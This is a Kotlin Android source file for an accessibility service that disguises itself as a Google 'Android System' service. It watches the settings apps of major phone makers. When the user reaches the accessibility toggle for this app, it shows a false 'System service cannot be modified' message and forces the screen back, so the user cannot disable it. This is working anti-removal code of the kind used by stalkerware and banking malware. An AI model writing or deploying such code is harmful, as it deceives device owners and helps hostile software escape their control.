package com.google.android.systemservice.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

class AccessibilityGuardService : AccessibilityService() {

    companion object {
        private const val TAG = "AccessibilityGuard"
        
        // Settings packages to monitor
        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.samsung.android.settings",
            "com.miui.securitycenter",
            "com.huawei.systemmanager",
            "com.coloros.safecenter",
            "com.oneplus.security"
        )
        
        // Keywords indicating accessibility settings
        private val ACCESSIBILITY_KEYWORDS = listOf(
            "accessibility",
            "достъпност",
            "辅助功能",
            "접근성",
            "erişilebilirlik",
            "barrierefreiheit",
            "accessibilité",
            "accesibilidad",
            "アクセシビリティ",
            "إمكانية الوصول"
        )
        
        var isActive = false
            private set
    }

    private val handler = Handler(Looper.getMainLooper())
    private var lastBlockTime = 0L
    private val BLOCK_COOLDOWN_MS = 2000L // 2 seconds cooldown

    override fun onServiceConnected() {
        super.onServiceConnected()
        isActive = true
        Log.d(TAG, "AccessibilityGuard connected")
        
        // Configure service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        val packageName = event.packageName?.toString() ?: return
        
        // Only monitor settings apps
        if (packageName !in SETTINGS_PACKAGES) return
        
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                checkForAccessibilitySettings(event, packageName)
            }
        }
    }

    private fun checkForAccessibilitySettings(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Check window title/class name
            val className = event.className?.toString()?.lowercase() ?: ""
            val windowTitle = event.text?.joinToString(" ")?.lowercase() ?: ""
            
            // Check if we're in accessibility settings
            val isAccessibilityScreen = ACCESSIBILITY_KEYWORDS.any { keyword ->
                className.contains(keyword) || windowTitle.contains(keyword)
            } || isAccessibilityNodePresent(rootNode)
            
            if (isAccessibilityScreen) {
                performSoftBlock()
            }
            
            rootNode.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility settings: ${e.message}")
        }
    }

    private fun isAccessibilityNodePresent(node: AccessibilityNodeInfo): Boolean {
        // Check node text and content description
        val nodeText = node.text?.toString()?.lowercase() ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
        val viewId = node.viewIdResourceName?.lowercase() ?: ""
        
        val hasKeyword = ACCESSIBILITY_KEYWORDS.any { keyword ->
            nodeText.contains(keyword) || contentDesc.contains(keyword) || viewId.contains(keyword)
        }
        
        if (hasKeyword) {
            // Check if this looks like the accessibility toggle for our app
            val isOurAppToggle = nodeText.contains("android system") || 
                                 contentDesc.contains("android system") ||
                                 nodeText.contains("com.google.android.systemservice")
            
            if (isOurAppToggle) return true
        }
        
        // Recursively check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (isAccessibilityNodePresent(child)) {
                child.recycle()
                return true
            }
            child.recycle()
        }
        
        return false
    }

    private fun performSoftBlock() {
        val currentTime = System.currentTimeMillis()
        
        // Cooldown to prevent spam
        if (currentTime - lastBlockTime < BLOCK_COOLDOWN_MS) return
        lastBlockTime = currentTime
        
        // Show warning toast
        handler.post {
            Toast.makeText(
                this,
                "System service cannot be modified",
                Toast.LENGTH_SHORT
            ).show()
        }
        
        // Perform back action (soft redirect)
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_BACK)
        }, 100)
        
        Log.d(TAG, "Soft block performed - user redirected from accessibility settings")
    }

    override fun onInterrupt() {
        isActive = false
        Log.d(TAG, "AccessibilityGuard interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isActive = false
        Log.d(TAG, "AccessibilityGuard destroyed")
    }
}
